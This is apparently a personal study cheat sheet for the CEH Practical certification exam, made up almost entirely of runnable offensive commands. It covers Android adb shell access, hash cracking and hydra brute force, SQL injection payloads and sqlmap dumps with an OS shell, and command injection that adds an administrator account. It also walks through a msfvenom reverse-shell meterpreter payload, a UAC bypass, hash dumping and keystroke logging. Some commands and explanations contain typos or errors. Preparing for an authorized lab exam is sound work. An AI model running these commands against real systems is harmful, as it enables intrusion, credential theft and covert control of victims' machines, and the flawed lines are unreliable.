# CEH_PRACTICAL
MOBILE (Android):
1)PhoneSploit
https://n00bie.medium.com/hacking-android-using-phonesploit-ffbb2a899e6
	apt-get install adb
	git clone github.com/01010000/phonesploit
	cd phonesploit
	pyhton3 phonesploit.py
	3 (Connect to new phone)
	Add IP address of android device
	4 (Access shell on phone)
	IP address again of android device
	pwd
	ls
	cd sdcard
	ls
	cd downloads
	cat accnt-info.txt
----------------------------------------------------------------------------------------------------------------
1- nmap ip -sV -p 5555    (Scan for adb port)
2- adb connect IP:5555    (Connect adb with parrot)
3- adb shell              (Access mobile device on parrot)
4- pwd --> ls --> cd sdcard --> ls --> cat secret.txt (If you can't find it there then go to Downloads folder using: cd downloads)
----------------------------------------------------------------------------------------------------------------

CRYPTOGRAPHY:

Hash identifier and Hash cracking
Hash Identifier ; Cryptool ; BCTextEncoder
https://www.onlinehashcrack.com/hash-identification.php
Hash-identifier (CLI)
Hash Crack
https://crackstation.net/
https://hashes.com/en/decrypt/hash
----------------------------------------------------------------------------------------------------------------
HASHCAT:
•	Steps-
1.	First identify hash - use hash-identifier OR john filename OR cyberchef OR any other online tool
2.	Crack - hashcat -m 1800 test.hash -o crack.txt /usr/share/wordlists/rockyou.txt, -m (Hash mode, give number of the hash type identified above) OR hashcat -m 1800 hash...... /usr/share/wordlists/rockyou.txt
----------------------------------------------------------------------------------------------------------------
Hashcat -a 3 -m 900 hash.txt /rockyou.txt
-a attack mode
-m hashtype
900 md4
1000 NTLM
1800 SHA512CRYPT
110 SHA1 with SALT HASH
0  MD5
100 SHA1
1400 SHA256
3200 BCRYPT
160 HMAC-SHA1
----------------------------------------------------------------------------------------------------------------
JOHN
1. First analyze hash type - `john hashfile.hash`
2. Then crack hash - `john hashfile.hash --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-SHA1`
3. Show the cracked password - `john --show --format=Raw-SHA1 hashfile.hash` OR `john --show hashfile.hash,
----------------------------------------------------------------------------------------------------------------
HYDRA:
- **FTP**: hydra -l user -P passlist.txt [ftp://10.10.46.122](ftp://10.10.46.122/)
   hydra -L userlist.txt -P passlist.txt [ftp://10.10.46.122](ftp://10.10.46.122/)
- **SSH**: hydra -l <username> -P <full path to pass> 10.10.46.122 -t 4 ssh
- Post Web Form: hydra -l <username> -P <wordlist> 10.10.46.122 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V

- `hydra -L /root/Desktop/Wordlists/Usernames.txt -P /root/Desktop/Wordlists/Passwords.txt ftp://[IP]`
- `hydra -l root -P passwords.txt [-t 32] <IP> ftp
- `hydra -L usernames.txt -P pass.txt <IP> mysql
- `hydra -l USERNAME -P /path/to/passwords.txt -f <IP> pop3 -V`
- `hydra -V -f -L <userslist> -P <passwlist> ***rdp***://<IP>`
- `hydra -P common-snmp-community-strings.txt target.com snmp
- `hydra -l Administrator -P words.txt 192.168.1.12 smb t 1
- `hydra -l root -P passwords.txt <IP> ss
------------------------------------------------------------------------------------------------
STEGNOGRAPHY:
1)snow.exe -C -p "test" confidential.txt
-C  compressing / uncompressing
-p  password
Open Stego (GUI tool)
----------------------------------------------------------------------------------------------------------------
2) 1- Hide Data Using Whitespace Stegnography- snow -C -m "My swiss account number is    121212121212" -p "magic" readme.txt readme2.txt  (magic is password and your secret is stored in readme2.txt along with the content of readme.txt)
 2- To Display Hidden Data- snow -C -p "magic" readme2.txt (then it will show the content of readme2.txt content)
----------------------------------------------------------------------------------------------------------------
ENUMERATION: 
1- NetBios enum using windows- in cmd type- nbtstat -a 10.10.10.10 (-a displays NEtBIOS name table)
2- NetBios enum using nmap- nmap -sV -v --script nbstat.nse 10.10.10.16
3- SNMP enum using nmap-  nmap -sU -p 161 10.10.10.10 (-p 161 is port for SNMP)--> Check if port is open
 snmp-check 10.10.10.10 ( It will show user accounts, processes etc) --> for parrot
4- DNS recon/enum -  dnsrecon -d www.google.com -z
5- FTP enum using nmap -  nmap -p 21 -A 10.10.10.10 
6- NetBios enum using enum4linux- 
enum4linux -u martin -p apple -n 10.10.10.10 (all info)
enum4linux -u martin -p apple -P 10.10.10.10 (policy info)
----------------------------------------------------------------------------------------------------------------

•	ping www.moviescope.com –f –l 1500 -> Frame size
•	tracert www.moviescope.com -> Determining hop count
----------------------------------------------------------------------------------------------------------------
Enumeration using Metasploit :
•	msfdb init
•	service postgresql start
•	msfconsole
•	msf > db_status
•	nmap -Pn -sS -A -oX Test 10.10.10.0/24
•	db_import Test
•	hosts -> To show all available hosts in the subnet
•	db_nmap -sS -A 10.10.10.16 -> To extract services of particular machine
•	services -> to get all available services in a subnet
SMB Version Enumeration using MSF
•	use scanner/smb/smb_version
•	set RHOSTS 10.10.10.8-16
•	set THREADS 100
•	run
•	hosts -> now exact os_flavor information has been updated
SNMP Enumeration (161) :
•	nmap –sU –p 161 10.10.10.12
•	nmap -sU -p 161 --script=snmp-brute 10.10.10.12
•	msfconsole
•	use auxiliary/scanner/snmp/snmp_login
•	set RHOSTS and exploit
•	use auxiliary/scanner/snmp/snmp_enum
•	set RHOSTS and exploit
NetBIOS Enumeration (139) : 
•	nbtstat –A 10.10.10.16
•	net use
•	net use \10.10.10.16\e ““\user:””
•	net use \10.10.10.16\e ““/user:””
•	NetBIOS Enumerator
•	
•	nbstat -a IP
•	-a netbios name table
•	-c list contents of Netbios name cache
•	net use
•	Displays connection status, Shared folder/drive and Network Information.
Enum4Linux Wins Enumeration :
•	enum4linux -u martin -p apple -U 10.10.10.12 -> Users Enumeration
•	enum4linux -u martin -p apple -o 10.10.10.12 -> OS Enumeration
•	enum4linux -u martin -p apple -P 10.10.10.12 -> Password Policy Information
•	enum4linux -u martin -p apple -G 10.10.10.12 -> Groups Information
•	enum4linux -u martin -p apple -S 10.10.10.12 -> Share Policy Information (SMB Shares Enumeration
Active Directory LDAP Enumeration : ADExplorer

Vulnerability Analysis 
•	nikto -h http://www.goodshopping.com -Tuning 1 
•	Nessus runs on https://localhost:8834
o	Username: admin 
o	Password: password
•	Nessus -> Policies > Advanced scan
•	Discovery > Host Discovery > Turn off Ping the remote host
•	Port Scanning > check the Verify open TCP ports found by local port enumerators
•	Advanced
o	Max number of TCP sessions per host and = unlimited
o	Max number of TCP sessions per scan = unlimited
•	Credentials > Windows > Username & Password
•	Save policy > Create new scan > User Defined
•	Enter name & Target
•	Schedule tab > Turn of Enabled
•	Hit launch from drop-down of save.
SQL INJECTION:
----------------------------------------------------------------------------------------------------------------
OWASP ZAP
Open the ZAP 
Add the webiste name to Autoscan
Click on the Alert tab to know about Vulnerabilities

----------------------------------------------------------------------------------------------------------------
SQL MAP

Open the vulnerable website 
Copy the cookie from the inspect element
Open the terminal to use sqlmap 
sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="mscope=1jwuydl="; --dbs
sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="mscope=1jwuydl=; ui-tabs-1=0" -D moveiscope --tables
sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="mscope=1jwuydl=; ui-tabs-1=0" -D moviescope -T user-Login --dump

You will get all the Useraname and Passwords of the website.
----------------------------------------------------------------------------------------------------------------

•  SQLMAP Extract DBS
•	sqlmap -u “http://www.moviescope.com/viewprofile.aspx?id=1” --cookie="xookies xxx" --dbs
•  Extract Tables
•	sqlmap -u “http://www.moviescope.com/viewprofile.aspx?id=1” --cookie="cookies xxx" -D moviescope --tables
•  Extract Columns
•	sqlmap -u “http://www.moviescope.com/viewprofile.aspx?id=1” --cookie="cookies xxx" -D moviescope -T User_Login --columns
•  Dump Data
•	sqlmap -u “http://www.moviescope.com/viewprofile.aspx?id=1” --cookie="cookies xxx" -D moviescope -T User_Login --dump
•  OS Shell to execute commands
•	sqlmap -u “http://www.moviescope.com/viewprofile.aspx?id=1” --cookie="cookies xxx" --os-shell
•  Login bypass
•	blah' or 1=1 --
•  Insert data into DB from login
•	blah';insert into login values ('john','apple123');
•  Create database from login
•	blah';create database mydatabase;
•  Execute cmd from login
•	blah';exec master..xp_cmdshell 'ping www.moviescope.com -l 65000 -t'; --
----------------------------------------------------------------------------------------------------------------

sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="mscope=1jwuydl=; ui-tabs-1=0" --os-shell
It opens up the Interactive OS shell.

----------------------------------------------------------------------------------------------------------------

mysql -U qdpmadmin -h 192.168.1.8 -P passwod 
show databases;
use qdpm;
show tables'
select * from users;
show databases;
use staff;
show tables;
select * from login;
select * from user;

When you have username and Password for the database.

----------------------------------------------------------------------------------------------------------------
1- Auth Bypass-  hi'OR 1=1 --
2- Insert new details if sql injection found in login page in username tab enter- blah';insert into login values('john','apple123');--
3- Exploit a Blind SQL Injection- In the website profile, do inspect element and in the console tab write -  document.cookie
Then copy the cookie value that was presented after this command. Then go to terminal and type this command,
sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value that you copied and don't remove square brackets]" --dbs
4- Command to check tables of database retrieved-  sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value that you copied and don't remove square brackets]" -D databasename --tables
5- Select the table you want to dump-  sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value that you copied and don't remove square brackets]" -D databasename -T Table_Name --dump   (Get username and password)
6- For OS shell this is the command-   sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value that you copied and don't remove square brackets]" --os-shell
6.1 In the shell type-   TASKLIST  (to view the tasks)
6.2 Use systeminfo for windows to get all os version
6.3 Use uname -a for linux to get os version
----------------------------------------------------------------------------------------------------------------

SCANNING NETWORKS:

nmap -sn 10.10.10.10/24 -oN nmap.txt
nmap -sC -sV -sS -O 10.10.10.11 -oN nmap.txt
nmap -A 10.10.10.10/24 -oN nmap.txt

nmap -sn -O 172.16.43.1/24 
nmap -sS -sC -sV -O 172.16.43.3 -oN nmap.txt
nmap 172.16.43.1/24

nmap -sV -sC -pA nmap 10.10.10.x
nmap -sC -sV -v -oN nmap.txt 10.10.10.10
nmap -sU -sV -A t4 -v -oN udp.txt 10.10.10.1

nmap -f IP
nmap -sn -PR IP
nmap -sn -PE ip-range
nmap -sn 10.10.10.10/24
nmap -sC -sS -sV -O IP
nmap -A IP

-sn disable port scan
-PR ARP ping scan
-PU UDP ping scan
-PE ICMP ECHO ping scan
-f  Splits IP into fragment packets

nmap --script smb-os-discovery.nse IP 
Displays OS, Computer-Name, Domain, WorkGroup and Ports.
----------------------------------------------------------------------------------------------------------------
1- Nmap scan for alive/active hosts command for 192.189.19.18- nmap -A 192.189.19.0/24 or nmap -T4 -A ip
2- Zenmap/nmap command for TCP scan- First put the target ip in the Target: and then in the Command: put this command- nmap -sT -v 10.10.10.16
3- Nmap scan if firewall/IDS is opened, half scan- nmap -sS -v 10.10.10.16 
If even this the above command is not working then use this command-  namp -f 10.10.10.16
4- -A command is aggressive scan it includes - OS detection (-O), Version (-sV), Script (-sS) and traceroute (--traceroute).
5- Identify Target system os with (Time to Live) TTL and TCP window sizes using wireshark- Check the target ip Time to live value with protocol ICMP. If it is 128 then it is windows, as ICMP value came from windows. If TTL is 64 then it is linux. Every OS has different TTL. TTL 254 is solaris.
6- Nmap scan for host discovery or OS- nmap -O 192.168.92.10 or you can use nmap -A 192.168.92.10
7- If host is windows then use this command - nmap --script smb-os-discovery.nse 192.168.12.22 (this script determines the OS, computer name, domain, workgroup, time over smb protocol (ports 445 or 139).
8- nmap command for source port manipulation, in this port is given or we use common port-  nmap -g 80 10.10.10.10
----------------------------------------------------------------------------------------------------------------
• Port Scanning using Hping3: hping3 --scan 1-3000 -S 10.10.10.10 
--scan parameter defines the port range to scan and –S represents SYN flag.
• Pinging the target using HPing3: hping3 -c 3 10.10.10.10 -c 3 means that we only want to send three packets to the target machine.
• UDP Packet Crafting hping3 10.10.10.10 --udp --rand-source --data 500
• TCP SYN request hping3 -S 10.10.10.10 -p 80 -c 5
-S will perform TCP SYN request on the target machine, -p will pass the traffic through which port is assigned, and -c is the count of the packets sent to the Target machine.
• HPing flood : hping3 10.10.10.10 –flood
---------------------------------------------------------------------------
Hacking Web Servers
•	FTP Bruteforce with Hydra
o	hydra -L /root/Desktop/Wordlists/Usernames.txt -P /root/Desktop/Wordlists/Passwords.txt ftp://10.10.10.11
---------------------------------------------------------------------------------------------------------------
1- Footprinting web server Using Netcat and Telnet- nc -vv www.movies.com 80
						    GET /HTTP/1.0
						    telnet www.movies.com 80
						    GET /HTTP/1.0
2- Enumerate Web server info using nmap-  nmap -sV --script=http-enum www.movies.com
3- Crack FTP credentials using nmap-  nmap -p 21 10.10.10.10 (check if it is open or not)
				      ftp 10.10.10.10 (To see if it is directly connecting or needing credentials)
Then go to Desktop and in Ceh tools folder you will find wordlists, here you will find usernames and passwords file.
Now in terminal type-  hydra -L /home/attacker/Desktop/CEH_TOOLS/Wordlists/Username.txt -P /home/attacker/Desktop/CEH_TOOLS/Wordlists/Password.txt ftp://10.10.10.10

hydra -l user -P passlist.txt ftp://10.10.10.10

----------------------------------------------------------------------------------------------------------------

Hacking Web Applications
•	Wordpress:
o	wpscan --url http://10.10.10.12:8080/CEH --enumerate u
o	wpscan --url http://IP/wp-login.php --usernames username --passwords /usr/share/wordlists/rockyou.txt --max-threads 50
o	wpscan --url IP --enumerate u
•	WP password bruteforce
o	msfconsole
o	use auxiliary/scanner/http/wordpress_login_enum
•	RCE 
o	ping 127.0.0.1 | hostname | net user
---------------------------------------------------------------------------------------------------------------
wpscan --url http://172.16.0.27:8080/CEH/ -u james -P /path/pass.txt
wpscan --url https://example/ --enumerate u (To enumerate the user)
----------------------------------------------------------------------------------------------------------------

1- Scan Using OWASP ZAP (Parrot)- Type zaproxy in the terminal and then it would open. In target tab put the url and click automated scan.
2- Directory Bruteforcing- gobuster dir -u 10.10.10.10 -w /home/attacker/Desktop/common.txt
3- Enumerate a Web Application using WPscan & Metasploit BFA-  wpscan --url http://10.10.10.10:8080/NEW --enumerate u  (u means username) 
Then type msfconsole to open metasploit. Type -  use auxilliary/scanner/http/wordpress_login_enum
 						 show options
						 set PASS_FILE /home/attacker/Desktop/Wordlist/password.txt
						 set RHOSTS 10.10.10.10  (target ip)
						 set RPORT 8080          (target port)
						 set TARGETURI http://10.10.10.10:8080/
						 set USERNAME admin
4- Brute Force using WPscan -    wpscan --url http://10.10.10.10:8080/NEW -u root -P passwdfile.txt (Use this only after enumerating the user like in step 3)
			         wpscan --url http://10.10.10.10:8080/NEW --usernames userlist.txt, --passwords passwdlist.txt 
5- Command Injection-  | net user  (Find users)
 		       | dir C:\  (directory listing)
                       | net user Test/Add  (Add a user)
		       | net user Test      (Check a user)
		       | net localgroup Administrators Test/Add   (To convert the test account to admin)
		       | net user Test      (Once again check to see if it has become administrator)
Now you can do a RDP connection with the given ip and the Test account which you created.
----------------------------------------------------------------------------------------------------------------
COMMAND INJECTION (DVWA):

Login to DVWA
Set the Security Level "Low"
Click on the Command Injection Tab 
Check the parameter is vulnerable or not and it is vulnerable 
Now enter the system cmd's
| hostname
| whoami
| dir C:\path.txt
| type path.txt

| net user
| net user Test /Add
| net user
| net user Test
| net localgroup Administrators Test /Add

Succefully created the "Test" user account.

------------------------------------------------------------------------------------------------
SNIFFING:

•  http.request.method == “POST” -> Wireshark filter for filtering HTTP POST request 
•  Capture traffic from remote interface via wireshark
•	Capture > Options > Manage Interfaces 
•	Remote Interface > Add > Host & Port (2002)
•	Username & password > Start
Password Sniffing using Wireshark- In pcap file apply filter: http.request.method==POST (you will get all the post request) Now to capture password click on edit in menu bar, then near Find packet section, on the "display filter" select "string", also select "Packet details" from the drop down of "Packet list", also change "narrow & wide" to "Narrow UTF-8 & ASCII", and then type "pwd" in the find section.

----------------------------------------------------------------------------------------------------------------
WIRESHARK DDOS & DOS :
https://www.comparitech.com/net-admin/wireshark-cheat-sheet/
https://www.hackers-arise.com/post/2018/09/27/network-forensics-part-2-detecting-and-analyzing-a-scada-dos-attack
To find DOS (SYN and ACK) : tcp.flags.syn == 1  , tcp.flags.syn == 1 and tcp.flags.ack == 0
To find passwords : http.request.method == POST
----------------------------------------------------------------------------------------------------------------
System Hacking
NTLM Hash crack :
•	responder -I eth0
•	usr\share\responder\logs --> Responder log location
•	john /usr/share/responder/logs/ntlm.txt
Rainbowtable crack using Winrtgen :
•	Open winrtgen and add new table
•	Select ntlm from Hash dropdown list.
•	Set Min Len as 4, Max Len as 6 and Chain Count 4000000
•	Select loweralpha from Charset dropdown list (it depends upon Password).
•	rcrack_gui.exe to crack hash with rainbow table
Hash dump with Pwdump7 and crack with ohpcrack :
•	In cmd ‘wmic useraccount get name,sid ‘ -1-> Get user acc names and SID  cd C:\Users\Admin\Desktop\pwdump7
•	PwDump7.exe > c:\hashes.txt
•	Replace boxes in hashes.txt with relevant usernames from step 1.
•	Ophcrack.exe -> load -> PWDUMP File
•	Tables -> Vista free -> select the table directory -> crack
HACKING WINDOWS AND ESCALATING PRIVILEGES:
- `msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -e x86/shikata_ga_nai -b "\x00" LHOST=10.10.10.11 -f exe > Desktop/Exploit.exe`
- Shared Folder Creation:
    - `mkdir /var/www/html/share`
    - `chmod -R 755 /var/www/html/share/`
    - `chown -R www-data:www-data /var/www/html/share/`
    - `ls -la /var/www/html/ | grep share`
- `service apache2 start`
- `cp /root/Desktop/Exploit.exe /var/www/html/share/`
- `msfconsole` → `use exploit/multi/handler` → `set payload windows/meterpreter/reverse_tcp` → `set LHOST 10.10.10.11` → `exploit -j -z`(start the listener)
- go to Windows 10 machine, open a browser and in the address bar type http://10.10.10.11/share, Click Exploit.exe file to download, double-click the executable to run it
type `sessions -i 1` 
- **get the Server username** - `getuid`
- `run post/windows/gather/smart_hashdump` → command fails to dump the password hashes because of insufficient privileges
- **attempt to elevate the user privileges** - `getsystem -t 1` → this command uses the **Service - Named Pipe Impersonation (In Memory/Admin) Technique →** it fails to escalate the privileges
- background the meterpreter session - `background`
- `use exploit/windows/local/bypassuac_fodhelper`
- `set SESSION 1` (1 is the current meterpreter session which was backgrounded)
- `set payload windows/meterpreter/reverse_tcp`
- `set LHOST 10.10.10.11`
- `set TARGET 0`
- `exploit`
- **This begins to exploit the UAC settings in Windows 10 machine, BypassUAC exploit has successfully bypassed the UAC setting on the Windows 10 machine**
- got meterpreter session
- `getuid`, still normal user
- attempt to elevate privileges - `getsystem`
- `getuid` → meterpreter session is now running with SYSTEM privileges (NT AU- HORITY\SYSTEM)
- **try to dump the password hashes -** `run post/windows/gather/smart_hashdump`
----------------------------------------------------------------------------------------------------------------
Hacking Windows 10 using Metasploit, and Post-Exploitation Using Meterpreter**
    - create a secret file on desktop & make exploit with name backdoor.exe, transfer it windows and execute it as above one
    - **view the MACE attributes of secret.txt (created time, accessed time, modified time, and entry modified time)** - `timestomp secret.txt -v`
    - `cd C:\`
    - `download bootmgr`
    - `search -f "filename.ext" (here pagefile.sys)`
    - **capture all keyboard input from the victim system -**  `keyscan_start`
    - Click Windows 10, and type some information in the secret.txt file
    - Click Kali Linux machine. Type `keyscan_dump` and press Enter. This dumps all the keystrokes
  - `idletime` → Issuing this command displays the number of seconds for which the user has been idle on the remote system.
----------------------------------------------------------------------------------------------------------------
CEWL & SEARCHSLOIT & NIKTO:
•	cewl example.com -m 5 -w words.txt
•	searchsploit "Linux Kernel"
•	searchsploit -m 7618 — Paste the exploit in the current directory
•	searchsploit -p 7618[.c] — Show complete path
•	searchsploit --nmap file.xml — Search vulns inside a Nmap XML result
•	nikto -h http://www.goodshopping.com Tuning 1

DIRECTORY BUSTING: (DIRB & GOBUSTER)

DIRB:
•	dirb <URL>(using default word list - /usr/share/dirb/wordlists/common.txt), dirb <http://webscantest.com>
•	dirb <URL> <wordlist_location>
•	dirb <http://10.10.230.124/> -X .php,.html → Enumerating Directory with Specific Extension List
•	dirb <http://10.10.230.124/> -o output.txt → Save Output to Disk
•	DirBuster
GOBUSTER:
•	gobuster dir -u <http://10.10.230.124/> -w /usr/share/wordlists/dirb/common.txt 2>/dev/null
•	gobuster dir -u <http://10.10.230.124/> -x txt,html -w /usr/share/wordlists/dirb/common.txt 2>/dev/null → Enumerating Directory with Specific Extension List
•	gobuster dir -u <http://10.10.230.124/dvwa> -w /usr/share/wordlists/dirb/common.txt -o output.txt 2>/dev/null → Save Output to Disk

